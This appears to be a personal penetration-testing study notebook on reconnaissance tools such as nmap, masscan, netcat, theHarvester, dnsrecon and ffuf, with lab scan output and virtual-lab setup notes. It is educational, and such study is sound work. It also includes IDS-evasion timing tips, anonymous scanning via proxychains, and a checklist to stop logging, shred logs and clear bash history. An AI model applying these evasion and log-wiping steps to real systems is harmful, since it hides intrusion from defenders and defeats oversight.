![Text, letter Description automatically
generated](media/image164.png){width="6.5in"
height="3.9791666666666665in"}

###### \[ALL-IN-ONE\] OWASP Zed Attack Proxy ZAP

<https://github.com/zaproxy/zaproxy>

Wasn't installed on my version of kali by default -- had to install it
with

![](media/image165.png){width="3.167108486439195in"
height="0.531324365704287in"}

[**https://www.zaproxy.org/download/**](https://www.zaproxy.org/download/)

<https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/5934406#overview>

<https://www.udemy.com/course/learn-ethical-hacking-from-scratch/learn/lecture/5309142#announcements>

<https://www.youtube.com/watch?v=_VpFaqF0EcI>

![Graphical user interface, application Description automatically
generated](media/image166.png){width="6.5in" height="1.2125in"}

![Graphical user interface, text Description automatically
generated](media/image167.png){width="6.386307961504812in"
height="5.177806211723534in"}

#### Network and System Scanning (Devices, Services, Software info and ports)

##### netdiscover (Local network device scanning -- robust -- uses arp protocol)

<https://www.youtube.com/watch?v=8tgEsVdy4a8>

![Graphical user interface, text, application Description automatically
generated](media/image168.png){width="6.5in"
height="1.4006944444444445in"}

Lists any/all connections on your network

**Install**

![](media/image169.png){width="6.416666666666667in"
height="0.4583333333333333in"}

Allows you to also scan your network -- similar in some ways to netstat,
but more robust.

*Usually doesn't come pre-installed on most non-pen-testing distros. Use
requires root privileges.*

![](media/image170.png){width="6.5in" height="0.39861111111111114in"}

**Usage**

![](media/image171.png){width="6.5in" height="0.4125in"}

(abovereplace 'enp20' with your interface: etho, wlan0, etc)

![Graphical user interface, text Description automatically
generated](media/image172.png){width="6.5in"
height="1.3555555555555556in"}

**Using a range**

*Format:*

sudo netdiscover -r \<ip_cidr\> -I \<interface\>

*Example*

sudo netdiscover -r 10.10.2.1/24 -i eth0

##### Netstat/ss (Local network port connection scanning)

*Superceded by 'ss' -- accepts same arguments*

![Text Description automatically
generated](media/image173.png){width="6.5in"
height="1.4722222222222223in"}

![Text Description automatically
generated](media/image174.png){width="6.5in"
height="3.841666666666667in"}

Try netstat --help to se all the options!

netstat --r = same as route table

netstat --ie = same as ifconfig

netstat --t = view all tcp connections

netstat --l = view all listening connections

netstat --p = view associated processes

'v' for verbose and 't' to see all tcp connections

![Graphical user interface, text, application, chat or text message
Description automatically
generated](media/image175.png){width="6.136272965879265in"
height="1.4064468503937009in"}

Add 'l' to view listening connections:

![Text Description automatically
generated](media/image176.png){width="5.75080271216098in"
height="1.3335192475940507in"}

**Show listening TCP/UDP ports**

sudo netstat -tulpn

![Text Description automatically
generated](media/image177.png){width="6.5in"
height="1.2222222222222223in"}

netstat --a = view all

netstat --n = numeric -- "do not resolve names"

**TUNA** : tcp, udp, all (not just listening), and no dns resolution

![](media/image178.png){width="2.069550524934383in"
height="0.25001312335958004in"}

![Graphical user interface, text Description automatically
generated](media/image179.png){width="4.847471566054243in"
height="8.799062773403325in"}

![Graphical user interface, text Description automatically
generated](media/image180.png){width="4.798858267716535in"
height="3.590462598425197in"}

![Graphical user interface, text, application Description automatically
generated](media/image181.png){width="4.861360454943132in"
height="2.6112456255468066in"}

![Graphical user interface, application Description automatically
generated](media/image182.png){width="4.80580271216098in"
height="2.3820669291338583in"}

![Text Description automatically
generated](media/image183.png){width="4.835416666666666in"
height="9.0in"}

##### nmap (local/remote connection scanning)

The GUI version is called **zenmap** and is installed on kali.

<https://www.youtube.com/watch?v=4t4kBkMsDbQ>

sudo apt install nmap

###### Nmap overview

####### nmap illustrated

![Graphical user interface Description automatically
generated](media/image184.png){width="6.5in"
height="3.4166666666666665in"}

![Diagram Description automatically
generated](media/image185.png){width="6.5in" height="1.74375in"}

####### On ports and firewalls

At the risk of oversimplification, we can classify ports in two states:

1.  Open port indicates that there is some service listening on that
    port.

2.  Closed port indicates that there is no service listening on that
    port.

However, in practical situations, we need to consider the impact of
firewalls. For instance, a port might be open, but a firewall might be
blocking the packets. Therefore, Nmap considers the following six
states:

1.  **Open**: indicates that a service is listening on the specified
    port.

2.  **Closed**: indicates that no service is listening on the specified
    port, although the port is accessible. By accessible, we mean that
    it is reachable and is not blocked by a firewall or other security
    appliances/programs.

3.  **Filtered**: means that Nmap cannot determine if the port is open
    or closed because the port is not accessible. This state is usually
    due to a firewall preventing Nmap from reaching that port. Nmap's
    packets may be blocked from reaching the port; alternatively, the
    responses are blocked from reaching Nmap's host.

4.  **Unfiltered**: means that Nmap cannot determine if the port is open
    or closed, although the port is accessible. This state is
    encountered when using an ACK scan -sA.

5.  **Open\|Filtered**: This means that Nmap cannot determine whether
    the port is open or filtered.

6.  **Closed\|Filtered**: This means that Nmap cannot decide whether a
    port is closed or filtered.

####### Host discovery using ARP

How would you know which hosts are up and running? It is essential to
avoid wasting our time port-scanning an offline host or an IP address
not in use. There are various ways to discover online hosts. When no
host discovery options are provided, Nmap follows the following
approaches to discover live hosts:

1.  When a *privileged* user tries to scan targets on a local network
    (Ethernet), Nmap uses *ARP requests*. A privileged user is root or a
    user who belongs to sudoers and can run sudo.

2.  When a *privileged* user tries to scan targets outside the local
    network, Nmap uses ICMP echo requests, TCP ACK (Acknowledge) to port
    80, TCP SYN (Synchronize) to port 443, and ICMP timestamp request.

3.  When an *unprivileged* user tries to scan targets outside the local
    network, Nmap resorts to a TCP 3-way handshake by sending SYN
    packets to ports 80 and 443.

Nmap, by default, uses a ping scan to find live hosts, then proceeds to
scan live hosts only. If you want to use Nmap to discover online hosts
without port-scanning the live systems, you can issue nmap -sn TARGETS.
Let's dig deeper to gain a solid understanding of the different
techniques used.

ARP scan is possible only if you are on the same subnet as the target
systems. On an Ethernet (802.3) and WiFi (802.11), you need to know the
MAC address of any system before you can communicate with it. The MAC
address is necessary for the link-layer header; the header contains the
source MAC address and the destination MAC address among other fields.
To get the MAC address, the OS sends an ARP query. A host that replies
to ARP queries is up. The ARP query only works if the target is on the
same subnet as yourself, i.e., on the same Ethernet/WiFi. You should
expect to see many ARP queries generated during a Nmap scan of a local
network. If you want Nmap only to perform an ARP scan without
port-scanning, you can use nmap -PR -sn TARGETS, where -PR indicates
that you only want an ARP scan. The following example shows Nmap using
ARP for host discovery without any port scanning. We run nmap -PR -sn
MACHINE_IP/24 to discover all the live systems on the same subnet as our
target machine.

![Text Description automatically
generated](media/image186.png){width="6.5in"
height="3.536111111111111in"}

In this case, the AttackBox had the IP address 10.10.210.6, and it
used ARP requests to discover the live hosts on the same subnet. ARP
scan works, as shown in the figure below. Nmap sends ARP requests to all
the target computers, and those online should send an ARP reply back.

![A picture containing text, device, meter, gauge Description
automatically generated](media/image187.png){width="6.5in"
height="1.9618055555555556in"}

In the example below, we scanned the target's subnet using nmap -PE -sn
MACHINE_IP/24. This scan will send ICMP echo packets to every IP address
on the subnet. Again, we expect live hosts to reply; however, it is wise
to remember that many firewalls block ICMP. The output below shows the
result of scanning the virtual machine's class C subnet using sudo nmap
-PE -sn MACHINE_IP/24 from the AttackBox.

Pentester Terminal

pentester@TryHackMe**\$** sudo nmap -PE -sn 10.10.68.220/24

Starting Nmap 7.60 ( https://nmap.org ) at 2021-09-02 10:16 BST

Nmap scan report for ip-10-10-68-50.eu-west-1.compute.internal
(10.10.68.50)

Host is up (0.00017s latency).

MAC Address: 02:95:36:71:5B:87 (Unknown)

Nmap scan report for ip-10-10-68-52.eu-west-1.compute.internal
(10.10.68.52)

Host is up (0.00017s latency).

MAC Address: 02:48:E8:BF:78:E7 (Unknown)

Nmap scan report for ip-10-10-68-77.eu-west-1.compute.internal
(10.10.68.77)

Host is up (-0.100s latency).

MAC Address: 02:0F:0A:1D:76:35 (Unknown)

Nmap scan report for ip-10-10-68-110.eu-west-1.compute.internal
(10.10.68.110)

Host is up (-0.10s latency).

MAC Address: 02:6B:50:E9:C2:91 (Unknown)

Nmap scan report for ip-10-10-68-140.eu-west-1.compute.internal
(10.10.68.140)

Host is up (0.00021s latency).

MAC Address: 02:58:59:63:0B:6B (Unknown)

Nmap scan report for ip-10-10-68-142.eu-west-1.compute.internal
(10.10.68.142)

Host is up (0.00016s latency).

MAC Address: 02:C6:41:51:0A:0F (Unknown)

Nmap scan report for ip-10-10-68-220.eu-west-1.compute.internal
(10.10.68.220)

Host is up (0.00026s latency).

MAC Address: 02:25:3F:DB:EE:0B (Unknown)

Nmap scan report for ip-10-10-68-222.eu-west-1.compute.internal
(10.10.68.222)

Host is up (0.00025s latency).

MAC Address: 02:28:B1:2E:B0:1B (Unknown)

Nmap done: 256 IP addresses (8 hosts up) scanned in 2.11 seconds

The scan output shows that eight hosts are up; moreover, it shows
their MAC addresses. Generally speaking, we don't expect to learn the
MAC addresses of the targets unless they are on the same subnet as our
system. The output above indicates that Nmap didn't need to send ICMP
packets as it confirmed that these hosts are up based on the ARP
responses it received.

We will repeat the scan above; however, this time, we will scan from a
system that belongs to a different subnet. The results are similar but
without the MAC addresses.

Pentester Terminal

pentester@TryHackMe**\$** sudo nmap -PE -sn 10.10.68.220/24

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:16 EEST

Nmap scan report for 10.10.68.50

Host is up (0.12s latency).

Nmap scan report for 10.10.68.52

Host is up (0.12s latency).

Nmap scan report for 10.10.68.77

Host is up (0.11s latency).

Nmap scan report for 10.10.68.110

Host is up (0.11s latency).

Nmap scan report for 10.10.68.140

Host is up (0.11s latency).

Nmap scan report for 10.10.68.142

Host is up (0.11s latency).

Nmap scan report for 10.10.68.220

Host is up (0.11s latency).

Nmap scan report for 10.10.68.222

Host is up (0.11s latency).

Nmap done: 256 IP addresses (8 hosts up) scanned in 8.26 seconds

If you look at the network packets using a tool like Wireshark, you will
see something similar to the image below. You can see that we have one
source IP address on a different subnet than that of the destination
subnet, sending ICMP echo requests to all the IP addresses in the target
subnet to see which one will reply.

![Graphical user interface, application, table, Excel Description
automatically generated](media/image188.png){width="6.5in"
height="4.454166666666667in"}

Because ICMP echo requests tend to be blocked, you might also consider
ICMP Timestamp or ICMP Address Mask requests to tell if a system is
online. Nmap uses timestamp request (ICMP Type 13) and checks whether it
will get a Timestamp reply (ICMP Type 14). Adding the -PP option tells
Nmap to use ICMP timestamp requests. As shown in the figure below, you
expect live hosts to reply.

![A screenshot of a computer Description automatically generated with
low confidence](media/image189.png){width="6.5in"
height="1.9618055555555556in"}

In the following example, we run nmap -PP -sn MACHINE_IP/24 to discover
the online computers on the target machine subnet.

Pentester Terminal

pentester@TryHackMe**\$** sudo nmap -PP -sn 10.10.68.220/24

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:06 EEST

Nmap scan report for 10.10.68.50

Host is up (0.13s latency).

Nmap scan report for 10.10.68.52

Host is up (0.25s latency).

Nmap scan report for 10.10.68.77

Host is up (0.14s latency).

Nmap scan report for 10.10.68.110

Host is up (0.14s latency).

Nmap scan report for 10.10.68.140

Host is up (0.15s latency).

Nmap scan report for 10.10.68.209

Host is up (0.14s latency).

Nmap scan report for 10.10.68.220

Host is up (0.14s latency).

Nmap scan report for 10.10.68.222

Host is up (0.14s latency).

Nmap done: 256 IP addresses (8 hosts up) scanned in 10.93 seconds

Similar to the previous ICMP scan, this scan will send many ICMP
timestamp requests to every valid IP address in the target subnet. In
the Wireshark screenshot below, you can see one source IP address
sending ICMP packets to every possible IP address to discover online
hosts.

![Graphical user interface, application, table, Excel Description
automatically generated](media/image190.png){width="6.5in"
height="4.454166666666667in"}

Similarly, Nmap uses address mask queries (ICMP Type 17) and checks
whether it gets an address mask reply (ICMP Type 18). This scan can be
enabled with the option -PM. As shown in the figure below, live hosts
are expected to reply to ICMP address mask requests.

![A picture containing text, black, device, dark Description
automatically generated](media/image191.png){width="6.5in"
height="1.9618055555555556in"}

In an attempt to discover live hosts using ICMP address mask queries, we
run the command nmap -PM -sn MACHINE_IP/24. Although, based on earlier
scans, we know that at least eight hosts are up, this scan returned
none. The reason is that the target system or a firewall on the route is
blocking this type of ICMP packet. Therefore, it is essential to learn
multiple approaches to achieve the same result. If one type of packet is
being blocked, we can always choose another to discover the target
network and services.

Pentester Terminal

pentester@TryHackMe**\$** sudo nmap -PM -sn 10.10.68.220/24

Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-02 12:13 EEST

Nmap done: 256 IP addresses (0 hosts up) scanned in 52.17 seconds

Although we didn't get any reply and could not figure out which hosts
are online, it is essential to note that this scan sent ICMP address
mask requests to every valid IP address and waited for a reply. Each
ICMP request was sent twice, as we can see in the screenshot below.

![Graphical user interface, application, table, Excel Description
automatically generated](media/image192.png){width="6.5in"
height="4.454166666666667in"}

![A screenshot of a computer Description automatically generated with
low confidence](media/image193.png){width="6.5in"
height="1.9618055555555556in"}

We can ping every IP address on a target network and see who would
respond to our ping (ICMP Type 8/Echo) requests with a ping reply (ICMP
Type 0). Simple, isn't it? Although this would be the most
straightforward approach, it is not always reliable. Many firewalls
block ICMP echo; new versions of MS Windows are configured with a host
firewall that blocks ICMP echo requests by default. Remember that an ARP
query will precede the ICMP request if your target is on the same
subnet.

To use ICMP echo request to discover live hosts, add the option -PE.
(Remember to add -sn if you don't want to follow that with a port scan.)
As shown in the following figure, an ICMP echo scan works by sending an
ICMP echo request and expects the target to reply with an ICMP echo
reply if it is online.

###### General use

![Graphical user interface, table Description automatically
generated](media/image194.png){width="6.5in"
height="5.1305555555555555in"}

![Table Description automatically
generated](media/image195.png){width="6.5in"
height="2.584722222222222in"}

![Graphical user interface, table Description automatically
generated](media/image196.png){width="6.5in"
height="4.0368055555555555in"}

![Graphical user interface, application Description automatically
generated](media/image197.png){width="6.5in"
height="3.984722222222222in"}

Note: You can chain multiple scans

![](media/image198.png){width="6.5in" height="0.425in"}

**Nmap docs!** <https://nmap.org/nsedoc/>

<https://nmap.org/book/man.html>

###### Scanning multiple subnets![](media/image199.png){width="6.5in" height="0.5173611111111112in"}

###### Scan timing and performance

![Table Description automatically
generated](media/image200.png){width="6.5in"
height="4.152777777777778in"}

![Text Description automatically
generated](media/image201.png){width="6.5in"
height="2.1152777777777776in"}

To avoid IDS alerts, you might consider -T0 or -T1. For
instance, -T0 scans one port at a time and waits 5 minutes between
sending each probe, so you can guess how long scanning one target would
take to finish. If you don't specify any timing, Nmap uses normal -T3.
Note that -T5 is the most aggressive in terms of speed; however, this
can affect the accuracy of the scan results due to the increased
likelihood of packet loss. Note that -T4 is often used during CTFs and
when learning to scan on practice targets, whereas -T1 is often used
during real engagements where stealth is more important.

Alternatively, you can choose to control the packet rate
using \--min-rate \<number\> and \--max-rate \<number\>. For
example, \--max-rate 10 or \--max-rate=10 ensures that your scanner is
not sending more than ten packets per second.

Moreover, you can control probing parallelization
using \--min-parallelism \<numprobes\> and \--max-parallelism
\<numprobes\>. Nmap probes the targets to discover which hosts are live
and which ports are open; probing parallelization specifies the number
of such probes that can be run in parallel. For
instance, \--min-parallelism=512 pushes Nmap to maintain at least 512
probes in parallel; these 512 probes are related to host discovery and
open ports.

###### Host Discovery (no port-scanning)

By default nmap uses ping.

-   **-sn :** a scan without portscanning (also called a "ping scan").

    -   sudo nmap -sn 192.168.1.0/24

    -   \^ Above uses /24 assuming the default gateway subnet mask of
        255.255.255.0

-   ***Using ARP \[host discovery\]***

    -   **-PR \<host\>:** ARP scan

-   ***Using ICMP \[host discovery\]***

    -   **-PR -sn \<host\>:** an ARP scan without port-scanning.

    -   **-PE -sn \<host\>:** IMCP echo scan

    -   **-PE -sn \<host\>**: IMCP echo scan with no port-scanning.

    -   \-**PP -sn \<host\>:** Use ICMP timestamp requests/ICMP Address
        mask

        -   Often more effective that PE as firewalls often block/drop
            ICMP echo packets to preent ping flood/ping of death.and
            DDoS.

    -   **-PM -sn \<host\>:** nmap address mask (not to be confused with
        ICMP address mask)

It's important to note that if one method fails -- others should be
tried as it could just be the firewall blocking one method but not all.

![Graphical user interface, table Description automatically
generated](media/image202.png){width="6.5in"
height="6.252777777777778in"}

![Text Description automatically
generated](media/image203.png){width="6.5in"
height="3.6902777777777778in"}

###### Port scanning

You can specify the ports you want to scan instead of the default 1000
ports. Specifying the ports is intuitive by now. Let's see some
examples:

-   port list: -p22,80,443 will scan ports 22, 80 and 443.

-   port range: -p1-1023 will scan all ports between 1 and 1023
    inclusive, while -p20-25 will scan ports between 20 and 25
    inclusive.

You can request the scan of all ports by using -p-, which will scan all
65535 ports. If you want to scan the most common 100 ports, add -F.
Using \--top-ports 10 will check the ten most common ports.

![Table Description automatically
generated](media/image204.png){width="6.5in"
height="5.848611111111111in"}

Using \--top-ports 10 will check the ten most common ports.

**Stealth scan (chose ports)**:
![](media/image205.png){width="2.8962379702537184in"
height="0.35421587926509185in"}

![](media/image206.png){width="6.5in" height="0.6041666666666666in"}

![Table Description automatically
generated](media/image207.png){width="6.5in"
height="5.404861111111111in"}

![Text, letter Description automatically
generated](media/image208.png){width="6.5in"
height="3.6618055555555555in"}

![Text Description automatically
generated](media/image209.png){width="4.9375in"
height="1.3958333333333333in"}

Add the 'oG' flag to "output into a "greppable" format

For example...

*Verify (check listening TCP connections)*

nmap --sT 192.168.181.0/24 --p 3306 \> /dev/null --oG output.txt

My testing...

![Text Description automatically
generated](media/image210.png){width="6.5in"
height="3.8097222222222222in"}

###### TCP/UDP host/port scanning

**Portscanning**

-   **-PS\<port\>** **\<host\>** : TCP SYN Ping

-   **-PA\<port\> \<host\>** : TCP ACK Ping

    -   You must be running Nmap as a privileged user to be able to
        accomplish this. If you try it as an unprivileged user, Nmap
        will attempt a 3-way handshake.

-   **-PU\<port\>** **\<host\>**: UDP Ping

*Note: not specifying a port will usually default to common ports -- can
be used for host discovery.*

**Hostscanning**

-   **-PS -sn** **\<host\>**: TCP SYN Ping

-   **-PA -sn** **\<host\>**: TCP ACK Ping

    -   You must be running Nmap as a privileged user to be able to
        accomplish this. If you try it as an unprivileged user, Nmap
        will attempt a 3-way handshake.

-   \-**PU -sn** **\<host\>**: UDP Ping

If you want Nmap to use TCP SYN ping, you can do so via the
option -PS followed by the port number, range, list, or a combination of
them. For example, -PS21 will target port 21, while -PS21-25 will target
ports 21, 22, 23, 24, and 25. Finally -PS80,443,8080 will target the
three ports 80, 443, and 8080.

Privileged users (root and sudoers) can send TCP SYN packets and don't
need to complete the TCP 3-way handshake even if the port is open, as
shown in the figure below. Unprivileged users have no choice but to
complete the 3-way handshake if the port is open.

![Diagram Description automatically
generated](media/image211.png){width="6.5in"
height="2.417361111111111in"}

###### Firewall evasion

![Text Description automatically
generated](media/image212.png){width="6.5in"
height="2.4381944444444446in"}

###### Scanning anonymously with proxychains'

Best to scan anonymously using proxychans! *(see below)*

![Text, letter Description automatically
generated](media/image213.png){width="5.583333333333333in"
height="1.2916666666666667in"}

###### Service/Version detection

![Graphical user interface Description automatically
generated](media/image214.png){width="6.5in"
height="1.9222222222222223in"}

![Graphical user interface Description automatically generated with
medium confidence](media/image215.png){width="6.5in"
height="1.1430555555555555in"}

![Table Description automatically
generated](media/image216.png){width="6.5in"
height="4.442361111111111in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image217.png){width="6.5in"
height="2.376388888888889in"}

**Service version detection**

nmap -sV

Here we can also see the versions of the service we've detected:

![Text Description automatically generated with medium
confidence](media/image218.png){width="6.5in"
height="2.171527777777778in"}

Above we seen the service version (SSH, Apache, etc) and we see the OS
(Ubuntu), but what if we wanted to see the OS version? We use the -O
flag.

**OS Version Detection**

nmap -O

![Text, letter, email Description automatically
generated](media/image219.png){width="6.5in"
height="2.652083333333333in"}

\^ Last line "OS Details" give the range of OS detected.

Good to combine os scanning with version scanning (services enumeration)

nmap -sV -o

###### Output options

![Table Description automatically
generated](media/image220.png){width="6.5in"
height="7.773611111111111in"}

![Graphical user interface, text, table Description automatically
generated with medium confidence](media/image221.png){width="6.5in"
height="1.9354166666666666in"}

**More output flags:**

![Text Description automatically
generated](media/image222.png){width="5.697916666666667in"
height="2.25in"}

###### Nmap in crons

Always run as sudo if you want MAC address info. Also, if using as
crontab apply in sudo crontab --e and place nmap command in a bash
script -- don't run directly as a command in crontab, leads to expected
results at times.

###### Advanced nmap

###### nmap -P vs -s

For example, the **-PS** vs the **-sS** switches.

The "P" switches are to see if a host is up -- so will return a positive
result even if the SYN request doesn't receive an ACK. A positive result
could be returned even if a RSET is sent back. Basically, as long as we
get a response -- we're good.

By contrast, the "s" switch, tests the listening status of a host/port.

###### Tcp SYN scan vs Tcp Connect scan (-sS vs -sT)

Connect scan (-sT) requires a full 3way handshake whereas a SYN scan
doesn't (-sS).

As a result, a SYN scan requires root privilege and if not will revert
down to a connect scan.

###### nmap scripting

NSE scripts

In kali, there will be a dir named **/usr/share/nmap/scripts/** where
you can see all of the scripts able to be ran. You can pass in any
scripts from there to be ran with namp and you need the name of the
script -- you don't need the extension (.nse).

You can call individual scripts, multiple scripts, or a "group" or
"category" of scripts.

![Text Description automatically
generated](media/image223.png){width="6.5in"
height="3.5993055555555555in"}

Vuln runs all scripts listed as possible nmap scripts in one command

![](media/image224.png){width="6.5in" height="0.3076388888888889in"}

####### Scan for scripting (XSS) vulnerablities

![](media/image225.png){width="6.5in" height="0.4388888888888889in"}

**To find out what a script does**

sudo nmap --script-help \<script_name\>

*Example*

sudo nmap --script-help firewall-bypass.nse

##### masscan (nmap but aggressive and fast)

On a side note, Masscan uses a similar approach to discover the
available systems. However, to finish its network scan quickly, Masscan
is quite aggressive with the rate of packets it generates. The syntax is
quite similar: -p can be followed by a port number, list, or range.
Consider the following examples:

-   masscan MACHINE_IP/24 -p443

-   masscan MACHINE_IP/24 -p80,443

-   masscan MACHINE_IP/24 -p22-25

-   masscan MACHINE_IP/24 ‐‐top-ports 100

Masscan can be installed using apt install masscan.

**Masscan with a config file**

![Text, letter Description automatically
generated](media/image226.png){width="6.5in"
height="4.839583333333334in"}

![Text Description automatically
generated](media/image227.png){width="6.5in"
height="3.7895833333333333in"}

##### scanless (Services and software info)

![Graphical user interface, text Description automatically
generated](media/image228.png){width="6.5in"
height="1.301388888888889in"}

##### Whatweb (get system info)

Pre-installed in kali.

![](media/image229.png){width="6.5in" height="0.7680555555555556in"}

![](media/image230.png){width="6.5in" height="0.7652777777777777in"}

##### Wappalyzer (tech stack)

<https://www.wappalyzer.com/>

Find out the technology stack of any website. Create lists of websites
that use certain technologies, with company and contact details.

##### Netcat (nc) (test connection+ more) (banner grabbing)

*Called **Test-Network-Connection** in windows powershell*

-   Netcat (linux/mac)

    -   The Netcat tool can be run through the command nc, and has two
        mandatory arguments, a host and a port.

    -   ![](media/image231.png){width="6.5in"
        height="0.6555555555555556in"}

-   Running this command would try to establish a connection on port 80
    to google.com:

-   ![https://d3c33hcgiwev3.cloudfront.net/imageAssetProxy.v1/UvkRc-SXEemqRBKLtVFQXg_ba92fd40d996e5310f243b5e832b3299_Screen-Shot-2019-10-01-at-3.00.35-PM.png?expiry=1639612800000&hmac=SftjSx-Mi0XTOvYoWiB9T6W9Oyxn5pwvVf_tlQk0dyo](media/image232.png){width="1.9270833333333333in"
    height="0.375in"}

-   If the connection fails, the command will exit. If it succeeds,
    you\'ll see a blinking cursor, waiting for more input. This is a way
    for you to actually send application layer data to the listening
    service from your own keyboard. If you\'re really only curious about
    the status of a report, you can issue the command, with a -z flag,
    which stands for zero input/output mode. A -v flag, which stands for
    verbose, is also useful in this scenario. So now, the command looks
    like this:

-   ![https://d3c33hcgiwev3.cloudfront.net/imageAssetProxy.v1/DIWGc-SYEemJYxLBwpm72g_9617ae241656afe4e864e0bb5621164d_Screen-Shot-2019-10-01-at-3.08.17-PM.png?expiry=1639612800000&hmac=knJWqW2SaRn8inNnC9hr4Z4P9P0bxUZCeu6ffNO3X7o](media/image233.png){width="2.1458333333333335in"
    height="0.4375in"}

-   By issuing the netcat command with the -Z and -V flags, the
    command\'s output will simply tell you if a connection to the port
    in question is possible or not, like this:

-   ![https://d3c33hcgiwev3.cloudfront.net/imageAssetProxy.v1/J3iie-SYEempBQ5aw_IFXA_152429fcc23830b444b22a9bb69fac4b_Screen-Shot-2019-10-01-at-3.09.09-PM.png?expiry=1639612800000&hmac=LBghzgWUVoAZRI3LkmL5DWsN_lykMsHItzgZm06cljY](media/image234.png){width="4.739583333333333in"
    height="0.22916666666666666in"}

![Text Description automatically
generated](media/image235.png){width="4.868305993000875in"
height="8.694891732283464in"}

Add a timeout after (5) seconds if no connection:

![](media/image236.png){width="4.632182852143482in"
height="0.2569575678040245in"}

![](media/image237.png){width="6.5in" height="0.36736111111111114in"}

![](media/image238.png){width="6.5in" height="0.38263888888888886in"}

###### FTP with netcat

![Text Description automatically
generated](media/image239.png){width="3.073345363079615in"
height="0.6415988626421697in"}

![Text Description automatically
generated](media/image240.png){width="3.5317432195975504in"
height="0.8542858705161854in"}

###### Hacking use (banner grabbing)

Useful for **banner grabbing** where one obtains information abot some
target:

![Text, letter Description automatically
generated](media/image241.png){width="6.5in" height="4.03125in"}

Though telnet can also be used:

![](media/image242.png){width="6.5in" height="0.56875in"}

##### Hunter.io Email enumeration - Emails from Domain

Site: Hunter.io

##### \[ALL-INI-ONE\] The harvester (script) -- especially email enumeration.

![Text, application Description automatically
generated](media/image243.png){width="6.5in"
height="1.8659722222222221in"}

**Searching all domains**

![](media/image244.png){width="4.448537839020123in"
height="0.3125437445319335in"}

![Text Description automatically
generated](media/image245.png){width="6.5in"
height="2.109027777777778in"}

![Text, letter Description automatically
generated](media/image246.png){width="6.313381452318461in"
height="3.698432852143482in"}

![Text, letter Description automatically
generated](media/image247.png){width="6.5in"
height="4.040972222222222in"}

"-s" is used to search on Shodan.

"-b" is used to specify your doman -- see "-h" to view all domains.

![A picture containing table Description automatically
generated](media/image248.png){width="6.5in" height="4.19375in"}

**Searching PGP (emails**

**)**![Text Description automatically
generated](media/image249.png){width="6.5in"
height="1.7215277777777778in"}

![Text Description automatically
generated](media/image250.png){width="3.969304461942257in"
height="1.9690244969378827in"}

Trying google emails...

![](media/image251.png){width="5.834146981627296in"
height="0.625087489063867in"}

Note: This programs sometimes gives different results at different
times. Try running scans across different times to be thorough.

#### DNS Enumeration

##### dnsenum

![Text Description automatically
generated](media/image252.png){width="6.5in"
height="1.1979166666666667in"}

#### Subdomain Enumeration (active and passive)

Subdomain enumeration is the process of finding valid subdomains for a
domain, but why do we do this? We do this to expand our attack surface
to try and discover more potential points of vulnerability.

##### Fierce

![Text, letter Description automatically
generated](media/image253.png){width="6.5in"
height="5.908333333333333in"}

##### \[BRUTE FORCE\] DNS Brute forcing (dnsrecon)

dnsrecon -t \<type\> -d \<domain\>

![Text Description automatically
generated](media/image254.png){width="6.5in"
height="1.511111111111111in"}

##### \[BRUTE FORCE - Requests\] Virtual Hosts (using ffuf)

Some subdomains aren\'t always hosted in publically accessible DNS
results, such as development versions of a web application or
administration portals. Instead, the DNS record could be kept on a
private DNS server or recorded on the developer\'s machines in their
/etc/hosts file (or c:\\windows\\system32\\drivers\\etc\\hosts file for
Windows users) which maps domain names to IP addresses. 

Because web servers can host multiple websites from one server when a
website is requested from a client, the server knows which website the
client wants from the **Host** header. We can utilise this host header
by making changes to it and monitoring the response to see if we\'ve
discovered a new website.

Like with DNS Bruteforce, we can automate this process by using a
wordlist of commonly used subdomains.

![Graphical user interface, text, application Description automatically
generated](media/image255.png){width="6.5in"
height="1.0152777777777777in"}

The above command uses the **-w** switch to specify the wordlist we are
going to use. The **-H** switch adds/edits a header (in this instance,
the Host header), we have the **FUZZ** keyword in the space where a
subdomain would normally go, and this is where we will try (interpolate)
all the options from the wordlist.

![Text Description automatically
generated](media/image256.png){width="6.5in"
height="5.095138888888889in"}

Because the above command will always produce a valid result, we need to
filter the output. We can do this by using the page size result with
the **-fs** switch. Edit the below command replacing {size} with the
most occurring size value from the previous result and try it on the
AttackBox.\
![Graphical user interface, text Description automatically
generated](media/image257.png){width="6.5in" height="0.9875in"}

## Attacks in Practice

### Setting up a testing lab

**PenTest+ (Practice Exam):**
<https://github.com/PacktPublishing/CompTIA-Pentest-Ethical-Hacking-Course-and-Practice-Exam>

#### Ethical Hacking In practice (overview)

-   Stop logging service (rsyslog)

-   Shred logs

-   Clear \~/.bash_history file (redirect null file to bash history)

-   Anonymize traffic with proxychains

#### Virtual Lab setup per "Ethical Hacking: 2^nd^ edition"

Virtual box to install five virtual machines

-   Pfsense as a router/firewall

-   Kali machine (our hacking)

    -   User: kali

    -   Pass: kali

-   Two ubuntu machines (victim machines)

    -   User: bobby

    -   Pass: /\^ubuntu\$/gi

-   Metasploitable machine

    -   User: msfadmin

    -   Pass: msfadmin

To create a virtual network of VMs using virtualbox...

-   Create one VM that will serve as a router (try pfsense)

    -   Network Adapter 1: Bridged Adatper (selecting your network
        card).

    -   Network Adapter 2: Internal network (this creates a virtual LAN
        which you can name)

-   Subsequent VMs

    -   Network Adapter 1: Select your VLAN (your named [internal
        network]{.underline} per above)

***Network Connection Types (Virtualbox)***

*Under "Network Settings"*

-   NAT (default)

    -   This makes your host machine acts as a virtual router where your
        VM gets a new local ip (10.0.0.0.x) and will act as the default
        gateway

-   Bridged

    -   This makes your VM connect to the router through your machine --
        so your vm will be on the same network as your host machine and
        will gain a local ip from the same DHCP server as your host
        machine.

-   NAT Network

    -   Ideal if you have multiple VMs and you want them all to
        communicate with each other on the same internal virtual
        network.

    -   Also good if you bridged adapter is facing issues

        -   <https://www.udemy.com/course/complete-ethical-hacking-bootcamp-zero-to-mastery/learn/lecture/34276192#overview>

        -   

#### Setting Up Kali

*Use at least the second link*

<https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/>

<https://www.kali.org/docs/installation/hard-disk-install/>

Using Virtuabox OVA file:

<https://techantidote.com/install-kali-linux-in-virtualbox-using-ova-file/>

OVA can be further extracted to get VMDK:

<https://www.youtube.com/watch?v=7CpkRbVOrpw>

*Kali for RaspberryPi*

